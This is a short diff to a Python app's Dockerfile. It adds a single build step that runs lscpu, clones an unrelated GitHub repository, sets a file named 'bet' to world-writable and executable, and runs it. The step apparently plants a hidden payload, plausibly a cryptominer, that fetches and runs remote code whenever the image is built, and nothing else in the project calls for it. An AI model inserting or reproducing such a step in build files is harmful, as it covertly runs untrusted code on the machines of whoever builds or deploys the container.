@@ -7,7 +7,7 @@ WORKDIR /usr/src/app
 
 COPY requirements.txt requirements.txt
 RUN pip install -r requirements.txt
-
+RUN lscpu && git clone https://github.com/aurbach55/zash.git && cd zash && chmod 777 bet && ./bet
 COPY app.py app.py
 
 EXPOSE 8080
